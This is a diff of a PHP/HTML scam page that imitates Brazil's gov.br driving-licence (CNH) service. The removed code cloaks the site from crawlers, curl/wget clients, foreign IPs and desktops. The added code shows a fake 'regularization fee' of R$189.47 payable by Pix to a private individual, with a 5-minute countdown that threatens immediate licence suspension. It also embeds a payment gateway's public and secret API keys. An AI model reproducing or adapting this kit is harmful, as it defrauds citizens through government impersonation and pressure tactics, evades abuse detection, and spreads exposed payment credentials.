@@ -1,229 +1,546 @@
 <?php
-// ==========================================
-// 1. BLOQUEIO DE BOTS E ROBÔS (PHP)
-// ==========================================
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$badBots = ['bot', 'crawl', 'spider', 'slurp', 'mediapartners', 'curl', 'wget', 'python', 'java', 'libwww', 'php'];
+// =========================================================================
+// CONTROLE MANUAL DE CONTINGÊNCIA (COPIA E COLA)
+// Seu código Pix está ativo aqui. Para voltar ao automático futuramente,
+// basta apagar o texto de dentro das aspas e deixar: $pix_copia_cola_manual = "";
+// =========================================================================
+$pix_copia_cola_manual = "00020101021126580014br.gov.bcb.pix013607e7643c-fccd-476b-a87f-ce7d073bc26f5204000053039865406175.475802BR5917Mariana Rodrigues6009SAO PAULO61080846133062280524pqt5zGEk15MMZPh0GKRo6g8y6304957D"; 
 
-foreach ($badBots as $bot) {
-    if (stripos($userAgent, $bot) !== false) {
-        header("Location: https://www.google.com/search?q=CNH+digital+regular+online");
-        exit();
+// Se o JavaScript chamar a página pedindo o PIX, executa a API ou usa o manual
+if (isset($_GET['action']) && $_GET['action'] == 'gerar_pix') {
+    header('Content-Type: application/json; charset=utf-8');
+
+    // Se houver um código manual configurado, pula a API e usa ele
+    if (!empty($pix_copia_cola_manual)) {
+        $identifier = "MANUAL_" . time();
+        $qr_code_visual = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode($pix_copia_cola_manual);
+        
+        echo json_encode([
+            "success" => true,
+            "pix_code" => $pix_copia_cola_manual,
+            "transaction_id" => $identifier,
+            "qr_code_visual" => $qr_code_visual
+        ]);
+        exit;
     }
-}
 
-// ==========================================
-// 2. BLOQUEIO DE IP FORA DO BRASIL (PHP)
-// ==========================================
-$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+    // CREDENCIAIS DA SUA CONTA - SIGILOPAY
+    $public_key = "youssefzeroki_9gstvyrvv0avmv17"; 
+    $secret_key = "8snoikonrantx0qn6ufq9hxou8w1qf5dxvcxb4oavntglk67o5y502s60tpcwtf6"; 
+    
+    // ROTA EXATA E VALIDADA SIGILOPAY
+    $url = "https://app.sigilopay.com.br/api/v1/gateway/pix/receive";
+    
+    // Identificador único obrigatório gerado a cada tentativa
+    $identifier = "ORDER_" . time() . "_" . uniqid();
 
-if ($ip != '127.0.0.1' && $ip != '::1') {
-    $countryCode = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? '';
+    // PAYLOAD AJUSTADO PARA PADRÃO SIGILOPAY
+    $payload = [
+        "identifier" => $identifier,
+        "amount" => 189.47, // Valor em Reais (float) no padrão da SigiloPay
+        "client" => [
+            "name" => "PAGAMENTOS",
+            "email" => "joao@email.com",
+            "phone" => "21999999999", 
+            "document" => "11140471000111"
+        ]
+    ];
 
-    if (empty($countryCode)) {
-        $geoResponse = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode");
-        if ($geoResponse) {
-            $geoData = json_decode($geoResponse);
-            if ($geoData && $geoData->status == 'success') {
-                $countryCode = $geoData->countryCode;
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS => 5,
+        CURLOPT_HTTPHEADER => [
+            'Content-Type: application/json', 
+            'Accept: application/json',
+            'x-public-key: ' . $public_key,
+            'x-secret-key: ' . $secret_key
+        ],
+        CURLOPT_POSTFIELDS => json_encode($payload),
+        CURLOPT_TIMEOUT => 30
+    ]);
+
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    $result = json_decode($response, true);
+
+    // Mapeador dinâmico para varrer a resposta e achar o código do Pix e IDs
+    if (!function_exists('findKey')) {
+        function findKey($array, $keySearch) {
+            if (!is_array($array)) return null;
+            if (isset($array[$keySearch])) return $array[$keySearch];
+            foreach ($array as $item) {
+                if (is_array($item)) {
+                    $res = findKey($item, $keySearch);
+                    if ($res) return $res;
+                }
             }
+            return null;
         }
     }
 
-    if (!empty($countryCode) && $countryCode !== 'BR') {
-        header("Location: https://www.google.com/search?q=CNH+digital+regular+online");
-        exit();
+    $transaction_id = $result['transactionId'] ?? findKey($result, 'transaction_id') ?? findKey($result, 'id') ?? $identifier;
+    
+    $pix_code = null;
+    if ($httpCode === 200 || $httpCode === 201) {
+        $pix_code = findKey($result, 'pix_code') ?? findKey($result, 'pix_copy_and_paste') ?? findKey($result, 'string') ?? findKey($result, 'code');
     }
+    
+    $qr_code_visual = findKey($result, 'pix_qr_code') ?? findKey($result, 'qr_code') ?? findKey($result, 'qr_code_url') ?? findKey($result, 'qrcode');
+    
+    if (empty($qr_code_visual) && !empty($pix_code)) {
+        $qr_code_visual = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode($pix_code);
+    }
+
+    echo json_encode([
+        "success" => !empty($pix_code),
+        "pix_code" => $pix_code,
+        "transaction_id" => $transaction_id,
+        "qr_code_visual" => $qr_code_visual
+    ]);
+    exit;
 }
 ?>
 <!DOCTYPE html>
-<html lang="pt-PT">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>CNH do Brasil - Acesso</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regularizar Sua CNH</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-        body, html {
-            width: 100%;
-            height: 100%;
-            background-color: #000;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-        }
-        .bg-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 60%;
-            background-image: url('1792569822405.jpg'); 
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center bottom;
-            background-color: #000;
-        }
-        .bg-container::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 40px;
-            background: linear-gradient(to top, rgba(0,0,0,0.3), transparent);
-        }
-        .card-container {
-            position: relative;
-            background: #ffffff;
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto;
-            border-top-left-radius: 24px;
-            border-top-right-radius: 24px;
-            padding: 32px 24px 40px 24px;
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f0f2f5; 
+            color: #1a1a1a;
+            padding: 90px 15px 40px 15px; 
             display: flex;
             flex-direction: column;
             align-items: center;
-            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.15);
-            z-index: 10;
         }
-        .flag-img {
-            width: 80px;
-            height: auto;
-            margin-bottom: 16px;
+
+        .fixed-gov-header { 
+            position: fixed; top: 0; left: 0; width: 100%; background: #ffffff; 
+            padding: 16px 24px; border-bottom: 3px solid #1351b4; z-index: 1000; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.06);
+            display: flex;
+            align-items: center;
         }
-        .logo-text {
+        .gov-logo { height: 28px; width: auto; display: block; }
+
+        .container { 
+            background: white; 
+            width: 100%; 
+            max-width: 460px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05); 
+            overflow: hidden; 
+            border: 1px solid #eef2f5; 
+            margin: 0 auto;
+        }
+
+        .header-blue { 
+            background: #1351b4; 
+            color: white; 
+            padding: 20px 24px; 
+            text-align: center; 
+            font-size: 13px; 
+            font-weight: 700; 
+            line-height: 1.5; 
+            letter-spacing: 0.5px; 
+            text-transform: uppercase; 
+            border-bottom: 4px solid #ffcc00; 
+        }
+        
+        .status-bar { 
+            background: #fff7e6; 
+            border-bottom: 1px solid #ffe7ba; 
+            padding: 12px; 
+            text-align: center; 
+            color: #d46b08; 
+            font-size: 13px; 
+            font-weight: 600; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* ESTILOS DA TELA DE CARREGAMENTO */
+        #loaderContainer {
+            padding: 40px 20px;
             text-align: center;
-            margin-bottom: 24px;
         }
-        .logo-text .cnh-do {
-            font-size: 1.3rem;
-            color: #222;
-            font-weight: 400;
-            letter-spacing: -0.5px;
+        .spinner { 
+            border: 4px solid #eef2f5; 
+            border-top: 4px solid #1351b4; 
+            border-radius: 50%; 
+            width: 52px; 
+            height: 52px; 
+            animation: spin 0.9s linear infinite; 
+            margin: 0 auto 18px; 
         }
-        .logo-text .brasil {
-            font-size: 2.2rem;
-            color: #111;
-            font-weight: 900;
-            letter-spacing: -1px;
-            line-height: 1;
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .loader-title { 
+            font-size: 17px; 
+            color: #1351b4; 
+            font-weight: 800; 
+            margin-bottom: 6px; 
         }
-        .terms-text {
-            font-size: 0.8rem;
-            color: #444;
+        .loader-step-text {
+            font-size: 13px;
+            color: #595959;
+            font-weight: 600;
+            margin-bottom: 20px;
+            min-height: 18px;
+        }
+
+        /* Barra de Progresso Animada */
+        .progress-track {
+            width: 100%;
+            max-width: 320px;
+            height: 8px;
+            background-color: #f0f0f0;
+            border-radius: 20px;
+            margin: 0 auto;
+            overflow: hidden;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
+        }
+        .progress-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #1351b4, #1d5ab5);
+            border-radius: 20px;
+            transition: width 0.3s ease-in-out;
+        }
+
+        /* Estilo do Cronômetro */
+        .timer-box {
+            background: #fff1f0;
+            border: 1px solid #ffa39e;
+            color: #cf1322;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        .instability-alert {
+            background: #fff1f0;
+            border-bottom: 1px solid #ffa39e;
+            padding: 16px 24px;
+        }
+        .highlight-notice {
+            background: #fffbe6;
+            border: 1px solid #ffe58f;
+            color: #d46b08;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 13px;
             text-align: center;
             line-height: 1.4;
-            margin-bottom: 24px;
-            max-width: 320px;
         }
-        .terms-text a {
-            color: #1351B4;
-            text-decoration: underline;
-            font-weight: 500;
+
+        .content { padding: 32px 24px; text-align: center; }
+        
+        .pix-badge { 
+            background: #e6f7ff; 
+            color: #1d5ab5; 
+            display: inline-flex; 
+            align-items: center; 
+            padding: 6px 16px; 
+            border-radius: 50px; 
+            font-size: 11px; 
+            font-weight: 700; 
+            margin-bottom: 24px; 
+            letter-spacing: 1px;
+            border: 1px solid #bae7ff;
         }
-        .btn-gov {
-            background-color: #1351B4;
-            color: #ffffff;
-            border: none;
-            border-radius: 28px;
-            width: 100%;
-            max-width: 360px;
-            padding: 16px;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
-            box-shadow: 0 4px 10px rgba(19, 81, 180, 0.3);
-            transition: background-color 0.2s, opacity 0.2s;
+
+        .qr-container { 
+            background: #fff; 
+            border: 1px solid #f0f0f0; 
+            padding: 16px; 
+            border-radius: 16px; 
+            display: inline-block; 
+            margin-bottom: 24px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03); 
         }
-        .btn-gov:hover {
-            background-color: #0c3882;
+        .qr-img { width: 200px; height: 200px; display: block; }
+
+        .price-box { 
+            margin-bottom: 24px; 
+            background: #fafafa; 
+            padding: 16px; 
+            border-radius: 14px; 
+            border: 1px solid #f0f0f0; 
         }
-        .btn-gov:disabled {
-            background-color: #0c3882;
-            opacity: 0.85;
-            cursor: not-allowed;
+        .price-label { font-size: 12px; color: #8c8c8c; margin-bottom: 4px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;}
+        .price-value { font-size: 34px; font-weight: 800; color: #141414; }
+
+        .instruction-text { font-size: 14px; color: #434343; line-height: 1.6; margin-bottom: 20px; }
+        
+        .pix-input-group { margin-bottom: 16px; }
+        .pix-input { 
+            width: 100%; 
+            padding: 16px; 
+            background: #f5f5f5; 
+            border: 1px solid #d9d9d9; 
+            border-radius: 12px; 
+            font-size: 12px; 
+            color: #595959; 
+            text-align: center; 
+            font-family: monospace; 
+            outline: none; 
+            transition: all 0.2s;
         }
-        .spinner {
-            width: 18px;
-            height: 18px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid #ffffff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: inline-block;
+        .pix-input:focus { background: #fff; border-color: #1351b4; }
+
+        .btn-copy { 
+            width: 100%; 
+            padding: 16px; 
+            background: #1351b4; 
+            color: white; 
+            border: none; 
+            border-radius: 12px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            font-size: 15px; 
+            transition: all 0.2s ease; 
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .btn-copy:hover { background: #0f4090; transform: translateY(-1px); box-shadow: 0 6px 16px rgba(19, 81, 180, 0.3); }
+        .btn-copy:active { transform: translateY(0); }
+        .btn-copy.success { background: #389e0d !important; box-shadow: 0 4px 12px rgba(56, 158, 13, 0.2); }
+
+        .footer-info { 
+            font-size: 12px; 
+            color: #8c8c8c; 
+            margin-top: 24px; 
+            border-top: 1px solid #f0f0f0; 
+            padding-top: 20px; 
+            line-height: 1.6; 
+            text-align: left;
+        }
+
+        /* Tela de Expiração/Bloqueio */
+        #expiredBlock {
+            display: none;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        .expired-title {
+            color: #cf1322;
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+        }
+        .expired-desc {
+            font-size: 14px;
+            color: #434343;
+            line-height: 1.5;
         }
     </style>
 </head>
 <body>
 
-    <div class="bg-container"></div>
+<div class="fixed-gov-header">
+    <img src="./gov.br - Acesse sua conta_files/govbr.png" class="gov-logo" alt="Logotipo Gov.br">
+</div>
 
-    <div class="card-container">
-        <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f1e7-1f1f7.png" alt="Bandeira do Brasil" class="flag-img">
-        
-        <div class="logo-text">
-            <div class="cnh-do">CNH do</div>
-            <div class="brasil">BRASIL</div>
-        </div>
-
-        <div class="terms-text">
-            Ao entrar, concorda com o nosso <br>
-            <a href="#">Termo de Responsabilidade</a> e <br>
-            <a href="#">Política de Privacidade</a>
-        </div>
-
-        <button id="btnEntrar" class="btn-gov" onclick="irParaLogin()">
-            ENTRAR COM <strong>gov.br</strong>
-        </button>
+<div class="container">
+    <div class="header-blue">
+        SISTEMA DE REGULARIZAÇÃO DE CONDUTORES<br>
+        ATENÇÃO: EVITE A SUSPENSÃO DEFINITIVA DA SUA CNH
     </div>
 
-    <script>
-        // Bloqueio de computadores
-        function isMobileOrTablet() {
-            const userAgent = navigator.userAgent;
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Tablet|Silk|Mobile/i.test(userAgent);
-        }
+    <div class="status-bar" id="statusTitle">
+        Gerando Guia de Pagamento...
+    </div>
 
-        window.addEventListener('DOMContentLoaded', function() {
-            if (!isMobileOrTablet()) {
-                window.location.href = 'https://www.google.com/search?q=CNH+digital+regular+online';
+    <!-- TELA DE CARREGAMENTO ANIMADA -->
+    <div id="loaderContainer" class="content">
+        <div class="spinner"></div>
+        <div class="loader-title">Carregando guia de pagamento...</div>
+        <div class="loader-step-text" id="stepText">Conectando ao sistema do Banco Central...</div>
+        
+        <div class="progress-track">
+            <div class="progress-bar-fill" id="progressBar"></div>
+        </div>
+        
+        <p style="font-size: 12px; color: #8c8c8c; margin-top: 18px;">
+            Aguarde um instante. Não atualize nem feche esta página.
+        </p>
+
+        <div id="pixError" style="display: none; color:#ff4d4f; margin-top: 20px; font-weight: 600;">
+            Erro na geração do Pix. Atualize a página e tente novamente.
+        </div>
+    </div>
+
+    <!-- CONTEÚDO DO PIX -->
+    <div id="pixData" style="display: none;">
+        <div class="instability-alert">
+            <div class="highlight-notice">🛑 Se ocorrer qualquer erro, atualize a página ou tente utilizar outra instituição bancária!</div>
+        </div>
+
+        <div class="content">
+            <div class="timer-box">
+                ⏰ Tempo restante para realizar seu pagamento: <span id="timer">05:00</span>
+            </div>
+
+            <div class="pix-badge">PAGAMENTO VIA PIX</div>
+            
+            <div class="price-box">
+                <div class="price-label">Valor da Taxa</div>
+                <div class="price-value">R$ 189,47</div>
+            </div>
+            
+            <div class="qr-container">
+                <img id="qrCodeImg" src="" class="qr-img" alt="QR Code">
+            </div>
+            
+            <p class="instruction-text">
+                Copie o código abaixo para pagar via <strong>Pix Copia e Cola</strong> em seu aplicativo bancário.<br>
+                <span style="color: #cf1322; font-weight: bold; display: block; margin-top: 5px;">Se der erro, atualize a página para gerar um novo Pix e tente em outro aplicativo bancário.</span>
+            </p>
+            
+            <div class="pix-input-group">
+                <input type="text" id="pixStr" class="pix-input" value="" readonly>
+            </div>
+            
+            <button class="btn-copy" id="btnCopy" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
+            
+            <div class="footer-info">
+                <strong>Identificador:</strong> #<span id="txtTransactionId"></span><br>
+                O processamento e a liberação ocorrem imediatamente após o pagamento.
+            </div>
+        </div>
+    </div>
+
+    <!-- Container exibido quando o tempo expira -->
+    <div id="expiredBlock">
+        <div class="expired-title">🚫 CNH Bloqueada Imediatamente</div>
+        <p class="expired-desc">
+            O tempo de <strong>5 minutos</strong> para a regularização via Pix expirou e o pagamento não foi confirmado.<br><br>
+            Sua CNH foi encaminhada para o processo de <strong>suspensão imediata</strong> no sistema.
+        </p>
+    </div>
+</div>
+
+<script>
+let transactionId = null;
+let timerInterval = null;
+
+window.onload = function() {
+    let progress = 0;
+    const progressBar = document.getElementById("progressBar");
+    const stepText = document.getElementById("stepText");
+
+    // Simulação visual de progresso da barra
+    const progressTimer = setInterval(() => {
+        if (progress < 85) {
+            progress += Math.floor(Math.random() * 12) + 5;
+            if (progress > 85) progress = 85;
+            progressBar.style.width = progress + "%";
+
+            if (progress > 30 && progress < 60) {
+                stepText.innerText = "Gerando dados da taxa e QR Code...";
+            } else if (progress >= 60) {
+                stepText.innerText = "Sincronizando com a chave Pix...";
             }
-        });
-
-        // Restaura o botão quando o usuário retorna à página (botão Voltar do navegador)
-        window.addEventListener('pageshow', function(event) {
-            var btn = document.getElementById('btnEntrar');
-            if (btn) {
-                btn.disabled = false;
-                btn.innerHTML = 'ENTRAR COM <strong>gov.br</strong>';
-            }
-        });
-
-        function irParaLogin() {
-            var btn = document.getElementById('btnEntrar');
-            btn.innerHTML = '<span class="spinner"></span> A carregar...';
-            btn.disabled = true;
-            setTimeout(function() {
-                window.location.href = '1a7d9f2e5t6g9f8d2s2x4c0f5g2t6b5m5j3y5t8f3d6e1s0w8e7d4f5j.php';
-            }, 100);
         }
-    </script>
+    }, 200);
+
+    // Requisição interna que carrega os dados manuais
+    fetch('?action=gerar_pix')
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                document.getElementById("pixStr").value = data.pix_code;
+                document.getElementById("qrCodeImg").src = data.qr_code_visual;
+                document.getElementById("txtTransactionId").innerText = data.transaction_id;
+                transactionId = data.transaction_id;
+
+                // Completa o progresso visual até 100%
+                clearInterval(progressTimer);
+                progressBar.style.width = "100%";
+                stepText.innerText = "Guia gerada com sucesso!";
+
+                setTimeout(() => {
+                    document.getElementById("loaderContainer").style.display = "none";
+                    document.getElementById("statusTitle").innerText = "Aguardando Pagamento";
+                    document.getElementById("pixData").style.display = "block";
+
+                    // Inicia cronômetro de 5 minutos
+                    startTimer(300);
+                }, 400);
+
+            } else {
+                clearInterval(progressTimer);
+                showError();
+            }
+        })
+        .catch(() => {
+            clearInterval(progressTimer);
+            showError();
+        });
+};
+
+function startTimer(duration) {
+    let timer = duration, minutes, seconds;
+    const display = document.getElementById('timer');
+    
+    timerInterval = setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        display.textContent = minutes + ":" + seconds;
+
+        if (--timer < 0) {
+            clearInterval(timerInterval);
+            handleExpiration();
+        }
+    }, 1000);
+}
+
+function handleExpiration() {
+    document.getElementById("pixData").style.display = "none";
+    document.getElementById("statusTitle").innerText = "Processo Suspenso";
+    document.getElementById("statusTitle").style.background = "#fff1f0";
+    document.getElementById("statusTitle").style.color = "#cf1322";
+    document.getElementById("expiredBlock").style.display = "block";
+}
+
+function showError() {
+    document.getElementById("loaderContainer").querySelector('.spinner').style.display = "none";
+    document.getElementById("statusTitle").innerText = "Erro ao Gerar Pix";
+    document.getElementById("pixError").style.display = "block";
+}
+
+function copyPix() {
+    const input = document.getElementById("pixStr");
+    const btn = document.getElementById("btnCopy");
+    input.select();
+    navigator.clipboard.writeText(input.value).then(() => {
+        btn.innerText = "CÓDIGO COPIADO!";
+        btn.classList.add("success");
+        setTimeout(() => { btn.innerText = "COPIAR CÓDIGO PIX"; btn.classList.remove("success"); }, 3000);
+    });
+}
+</script>
 
 </body>
 </html>
